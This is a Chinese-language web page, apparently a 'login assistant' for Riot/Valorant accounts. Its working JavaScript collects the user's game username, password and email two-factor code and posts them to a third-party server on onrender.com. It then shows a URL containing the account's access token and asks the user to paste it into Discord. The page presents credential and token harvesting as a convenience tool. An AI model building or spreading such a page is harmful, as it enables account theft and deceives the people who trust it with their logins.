<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zenith 特戰極速登入助手</title>
    <style>
        body { font-family: "Segoe UI", Arial, sans-serif; background-color: #0b0b0b; color: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
        .container { background-color: #111111; border: 1px solid #222222; padding: 35px 25px; border-radius: 4px; max-width: 400px; width: 100%; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.8); }
        h1 { font-size: 22px; font-weight: 700; letter-spacing: 2px; margin-bottom: 8px; color: #ff4655; }
        .subtitle { color: #888888; font-size: 13px; margin-bottom: 25px; }
        .input-group { text-align: left; margin-bottom: 15px; }
        label { display: block; font-size: 12px; color: #aaaaaa; margin-bottom: 5px; font-weight: 600; }
        input { width: 100%; padding: 12px; background-color: #161616; border: 1px solid #333; color: #fff; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
        input:focus { border-color: #ff4655; outline: none; }
        .btn { display: block; width: 100%; padding: 12px 0; background-color: #ff4655; color: #ffffff; font-weight: 700; font-size: 15px; border-radius: 4px; cursor: pointer; border: none; margin-top: 20px; width: 100%; }
        .btn:hover { background-color: #dc3d4b; }
        .btn:disabled { background-color: #555; cursor: not-allowed; }
        .result-box { margin-top: 20px; background: #000; padding: 15px; border-radius: 4px; display: none; text-align: left; }
        .result-title { color: #ff4655; font-size: 12px; font-weight: bold; margin-bottom: 5px; }
        textarea { width: 100%; height: 80px; background: #111; border: 1px solid #222; color: #00ffcc; font-size: 11px; resize: none; word-break: break-all; margin-top: 5px; padding: 10px; box-sizing: border-box; border-radius: 4px; }
        .status-msg { color: #ffcc00; font-size: 13px; margin-top: 10px; text-align: left; min-height: 20px; line-height: 1.5; }
    </style>
</head>
<body>

<div class="container">
    <h1>Zenith Login Assistant</h1>
    <div class="subtitle">放棄麻煩的書籤！輸入帳密一鍵極速獲取網址</div>
    
    <div id="loginForm">
        <div id="credentialsArea">
            <div class="input-group">
                <label>RIOT 登入帳號 (Username)</label>
                <input type="text" id="username" placeholder="請輸入遊戲登入帳號...">
            </div>
            <div class="input-group">
                <label>RIOT 登入密碼 (Password)</label>
                <input type="password" id="password" placeholder="請輸入遊戲登入密碼...">
            </div>
        </div>
        
        <div class="input-group" id="mfaGroup" style="display: none;">
            <label style="color: #00ffcc; font-weight: bold;">🔒 請輸入電子郵件收到的 6 位數二步驟驗證碼</label>
            <input type="text" id="mfaCode" placeholder="請輸入 6 位數代碼...">
        </div>

        <button class="btn" id="submitBtn" onclick="processAuth()">➔ 一鍵安全獲取商店網址</button>
        <div class="status-msg" id="statusMsg"></div>
    </div>

    <div class="result-box" id="resultBox">
        <div class="result-title">🎉 成功生成！請複製下方整條網址貼回 Discord：</div>
        <textarea id="outputUrl" readonly></textarea>
        <button class="btn" style="background:#333; margin-top:10px;" onclick="copyResult()">一鍵複製網址</button>
    </div>
</div>

<script>
const BACKEND_URL = "https://zenith-auth-daily.onrender.com";
let currentStage = "LOGIN"; // 狀態機：LOGIN 或者是 MFA

async function processAuth() {
    const btn = document.getElementById('submitBtn');
    const statusMsg = document.getElementById('statusMsg');
    
    btn.disabled = true;

    if (currentStage === "LOGIN") {
        const user = document.getElementById('username').value.trim();
        const pass = document.getElementById('password').value.trim();
        if(!user || !pass) { alert('請填寫帳號和密碼！'); btn.disabled = false; return; }

        statusMsg.innerText = "🔑 正在向 Riot 伺服器提交憑證驗證...";
        try {
            let res = await fetch(`${BACKEND_URL}/api/auth/login`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ username: user, password: pass })
            });
            let data = await res.json();
            handleResponse(data);
        } catch (err) {
            alert("連線後端發生錯誤！");
            btn.disabled = false;
        }
    } else if (currentStage === "MFA") {
        const mfa = document.getElementById('mfaCode').value.trim();
        if(!mfa) { alert('請輸入驗證碼！'); btn.disabled = false; return; }

        statusMsg.innerText = "⏳ 正在送出二步驟驗證碼...";
        try {
            let res = await fetch(`${BACKEND_URL}/api/auth/mfa`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ code: mfa })
            });
            let data = await res.json();
            handleResponse(data);
        } catch (err) {
            alert("驗證碼發送錯誤！");
            btn.disabled = false;
        }
    }
}

function handleResponse(data) {
    const btn = document.getElementById('submitBtn');
    const statusMsg = document.getElementById('statusMsg');

    // 情況 A：成功拿到 Token 網址
    if (data.response && data.response.parameters && data.response.parameters.uri) {
        let originalUri = data.response.parameters.uri;
        let match = originalUri.match(/access_token=([^&]+)/);
        if (match) {
            document.getElementById('outputUrl').value = "https://playvalorant.com/zh-tw/opt_in/#access_token=" + match[1];
            document.getElementById('resultBox').style.display = "block";
            document.getElementById('loginForm').style.display = "none";
            statusMsg.innerText = "";
        }
        return;
    }

    // 情況 B：觸發二步驟驗證 (Riot 回傳物件裡有 type: "mfa" 或是 error: "mfa_required")
    if (data.type === "mfa" || data.error === "mfa_required") {
        document.getElementById('credentialsArea').style.display = "none"; // 隱藏帳密框
        document.getElementById('mfaGroup').style.display = "block";        // 顯示驗證碼框
        statusMsg.innerText = "🔒 偵測到驗證保護！請至信箱收信，打上 6 位數驗證碼後再次點擊按鈕！";
        currentStage = "MFA";
        btn.disabled = false;
        return;
    }

    // 情況 C：密碼或代碼真的打錯
    alert("驗證失敗：請檢查輸入是否正確，或重新整理再試一次。");
    btn.disabled = false;
    statusMsg.innerText = "❌ 驗證失敗";
}

function copyResult() {
    let t = document.getElementById('outputUrl');
    t.select();
    document.execCommand('copy');
    alert('🎉 複製成功！');
}
</script>

</body>
</html>
